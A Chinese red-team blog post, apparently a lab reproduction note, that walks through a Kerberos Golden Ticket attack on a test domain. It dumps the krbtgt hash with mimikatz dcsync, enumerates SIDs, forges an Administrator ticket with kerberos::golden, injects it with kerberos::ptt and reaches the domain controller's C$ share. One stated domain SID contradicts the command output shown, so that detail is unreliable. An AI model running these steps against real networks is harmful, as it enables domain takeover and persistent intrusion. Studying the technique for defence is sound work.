> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/NAx05Q_scPSZMDXeRXZieQ)

渗透攻击红队

一个专注于红队攻击的公众号

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/dzeEUCA16LKwvIuOmsoicpffk7N0cVibfDoZibS8XU01CtEtSbwM3VGr3qskOmA1VkccY0mwKTCq6u2ia1xYRwBn3A/640?wx_fmt=jpeg)

  

  

大家好，这里是 **渗透攻击红队** 的第 **37** 篇文章，本公众号会记录一些我学习红队攻击的复现笔记（由浅到深），不出意外每天一更

![](https://mmbiz.qpic.cn/mmbiz_gif/7QRTvkK2qC4T65TNkYZsPg2BJ2VwibZicuBhV9DGqxlsxwG0n2ibhLuBsiamU7S0SqvAp6p33ucxPkuiaDiaKD6ibJGaQ/640?wx_fmt=gif)

黄金票据

在渗透测试过程中，攻击者往往会给自己留下多条进入内网的通道，如果我们忘记将 krbtgt 账号重置，攻击者就能快速重新拿到域控制器的权限。

假设域内存在一个 SID 为 502 的域账号 krbtgt 。krbtgt 是 KDC 服务使用的账号，属于 Domain Admins 组，在域环境中，每个用户账号票据都是由 krbtgt 生成的，如果攻击者拿到了 krbtgt 的 NTLM Hash 或者 AES-256 值，就可以伪造域内任意用户的身份，并以该用户的身份访问其他服务。

在使用黄金票据（Golden Ticket）攻击时，需要以下信息：

*   需要伪造的域管理员用户名（一般是域管账户）
    
*   完整的域名
    
*   域 krbtgt  SID（就是域成员 krbtgt SID 去掉最后的）
    
*   krbtgt 的 NTLM Hash 或 AES-256 值
    

**Golden Ticket**

**实验环境**

域控制器：

*   IP：192.168.3.21
    
*   域名：god.org
    
*   用户名：administrator
    
*   密码：Admin12345
    

域成员服务器：

*   IP：192.168.3.25
    
*   域名：god.org
    
*   用户名：mary
    
*   密码：admin!@#45
    

**黄金票据（Golden Ticket）攻击实践**

#### 1、导出 krbtgt 的 NTLM Hash

使用 mimikatz 导出 krbtgt 的 NTLM Hash：（使用域管权限）

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLjibhjardC4HjNckWL8oTY0OojVXg3FiapwppRD3Zv5Iml1SmCVs7ZMv7ib46YqpvMCfJibiaAVicRVCdA/640?wx_fmt=png)

得到的：

```
Hash NTLM: b097d7ed97495408e1537f706c357fc5
aes256_hmac (4096) : 5a75bb9a4fc4453c66621a54af111884f45bbca6365bf4d81bc059f31e708827
Object Security ID   : S-1-5-21-1218902331-2157346161-1782232778
```

该方法使用 mimikatz 工具的 dcsync 功能远程转储活动目录 AD 中的 ntds.dit。指定 /user 参数，可以只导出 krbtgt 账号信息。

#### 2、获取基本信息

1、获取域 SID：

```
wmic useraccount get name,sid
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLjibhjardC4HjNckWL8oTY0y7RW6j7bDUnbLqAMBMSeDZopFwicdPUrOuvhOdVaT6gcIXrXm66zKkw/640?wx_fmt=png)

得到的：

```
Name                  SID
Administrator         S-1-5-21-1097424059-774219462-107513682-500
Guest                 S-1-5-21-1097424059-774219462-107513682-501
mary                  S-1-5-21-1097424059-774219462-107513682-1000
Administrator         S-1-5-21-1218902331-2157346161-1782232778-500
Guest                 S-1-5-21-1218902331-2157346161-1782232778-501
krbtgt                S-1-5-21-1218902331-2157346161-1782232778-502
SM_6ef9b5ce414946ae9  S-1-5-21-1218902331-2157346161-1782232778-1119
SM_d80bb46e75164f258  S-1-5-21-1218902331-2157346161-1782232778-1120
SM_d3853544b62a421fb  S-1-5-21-1218902331-2157346161-1782232778-1121
SM_c330a5709f6a478b8  S-1-5-21-1218902331-2157346161-1782232778-1122
mary                  S-1-5-21-1218902331-2157346161-1782232778-1124
jenkins               S-1-5-21-1218902331-2157346161-1782232778-1126
mack                  S-1-5-21-1218902331-2157346161-1782232778-1127
hr                    S-1-5-21-1218902331-2157346161-1782232778-1128
boss                  S-1-5-21-1218902331-2157346161-1782232778-1129
dbadmin               S-1-5-21-1218902331-2157346161-1782232778-1130
vpnadm                S-1-5-21-1218902331-2157346161-1782232778-1131
webadmin              S-1-5-21-1218902331-2157346161-1782232778-1132
fileadmin             S-1-5-21-1218902331-2157346161-1782232778-1135
fedora                S-1-5-21-1218902331-2157346161-1782232778-1139
kali                  S-1-5-21-1218902331-2157346161-1782232778-1140
debian                S-1-5-21-1218902331-2157346161-1782232778-1141
itadmin               S-1-5-21-1218902331-2157346161-1782232778-1142
devadmain             S-1-5-21-1218902331-2157346161-1782232778-1143
logers                S-1-5-21-1218902331-2157346161-1782232778-1144
logtest               S-1-5-21-1218902331-2157346161-1782232778-1145
klion                 S-1-5-21-1218902331-2157346161-1782232778-1146
klionsec              S-1-5-21-1218902331-2157346161-1782232778-1147
```

采用这种方法，可以以普通域用户权限获取域内大部分用户的 SID，可以看到域 god.org 的域 SID 为：S-1-5-21-95064677-3481858386-3840636109。

2、获取当前用户的 SID：

```
whoami /user
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLjibhjardC4HjNckWL8oTY0rib0o81CVZIia3ibl5sK8Eiby4jEUpEaw7JDj8NiaIwbrL3qqmiaib2y84Fcg/640?wx_fmt=png)

得到的：  

```
USER INFORMATION
----------------

User Name SID
========= ==============================================
god\mary  S-1-5-21-1218902331-2157346161-1782232778-1124
```

3、查询域管理员账号：

```
net group "domain admins" /domain
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLjibhjardC4HjNckWL8oTY0m3zMnybjpdzMPF7vUHbDRicyCAmvm1WkzFydXJubYUrU1D8yMyFFm2g/640?wx_fmt=png)

得到的域管用户名是：Administrator。  

4、查询域名：

```
ipconfig /all
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLjibhjardC4HjNckWL8oTY0tpDa7pgEfibUFjwJgmN4m2a7bvqXHs7qI3wKtBqvR532Z8y0vfZKzeA/640?wx_fmt=png)

得到的域名为：god.org。

#### 3、实验操作

首先我们是无法查看到域控的共享信息的：

```
dir \\OWA2010CN-God\c$
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLjibhjardC4HjNckWL8oTY033qE4dVib4jMYWFiaVZeOfoeygruntPoUGoVagrhTibpKvI4CpTZJUicyQ/640?wx_fmt=png)

1、清空内存  

使用 mimikatz 清空当前主机会话中的票据：

```
kerberos::purge
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLjibhjardC4HjNckWL8oTY0YO3utbORjIFWsgDYkciaJvUoVgm5ZTWBMxLou0vkhQp5FrYQico4xx6g/640?wx_fmt=png)

2、生成票据  

使用 mimikatz 生成包含 krbtgt 身份的票据：（在域管下执行）

```
kerberos::golden /user:administrator /domain:god.org /sid:S-1-5-21-1218902331-2157346161-1782232778 /krbtgt:b097d7ed97495408e1537f706c357fc5 /ticket:Administrator.kiribi
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLjibhjardC4HjNckWL8oTY0bcG9waGWXppUaTNykJ703V0GgOMGRI2Hj6SgyZBibsrU6h33ia8DwPwA/640?wx_fmt=png)

这个时候会在当前目录下生成一个名为：Administrator.kiribi 的文件！  

3、传递票据并注入内存  

将 Administrator.kiribi 票据放到域成员 mary 机器上然后注入内存：（使用 mary 运行）

```
kerberos::ptt Administrator.kiribi
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLjibhjardC4HjNckWL8oTY00BfAwa4lWL9iaDayTicE78UIlg4cliaOLuicDl7b3GOFqtGSdyRBx5dXYA/640?wx_fmt=png)

4、检索当前会话中的票据  

查看注入的票据：

```
kerberos::tgt
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLjibhjardC4HjNckWL8oTY0vEDL8oBWMhLk8GibXxDzV6FhAAICpdUkkmqQQqVgRUl2YAGBI37dDeA/640?wx_fmt=png)

可以看到当前的票据已经在内存会话中了。  

#### 4、验证权限

我们已经把票据注入到内存了，这个时候我们就可以看看是否获取到了域控的权限：

```
dir \\OWA2010CN-God\c$
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLjibhjardC4HjNckWL8oTY06823v7MBEvtWWIeccEU76Fb5OuZ3oAiawXRtbrQTIdwiaAmt7cWJ3GvA/640?wx_fmt=png)

如果想要清除内存中的票据可以使用：

```
kerberos::purge
```

**结尾**

使用黄金票据伪造的用户可以是任意用户（即使这个用户不存在），因为 TGT 的加密是由 krbtgt 完成的，所以只要 TGT 被 krbtgt 账户和密码正确的加密，那么任意 KDC 使用 krbtgt 将 TGT 解密后，TGT 中的所有信息都是可信的。

* * *

参考文章：  

https://www.jianshu.com/p/4936da524040

https://blog.csdn.net/shuteer_xu/article/details/107031951

![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)  

渗透攻击红队

一个专注于渗透红队攻击的公众号

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/dzeEUCA16LKwvIuOmsoicpffk7N0cVibfDdjBqfzUWVgkVA7dFfxUAATDhZQicc1ibtgzSVq7sln6r9kEtTTicvZmcw/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKwvIuOmsoicpffk7N0cVibfDY9HXLCT5WoDFzKP1Dw8FZyt3ecOVF0zSDogBTzgN2wicJlRDygN7bfQ/640?wx_fmt=png)

点分享

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKwvIuOmsoicpffk7N0cVibfDRwPQ2H3KRtgzicHGD2bGf1Dtqr86B5mspl4gARTicQUaVr6N0rY1GgKQ/640?wx_fmt=png)

点点赞

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKwvIuOmsoicpffk7N0cVibfDgRo5uRP3s5pLrlJym85cYvUZRJDlqbTXHYVGXEZqD67ia9jNmwbNgxg/640?wx_fmt=png)

点在看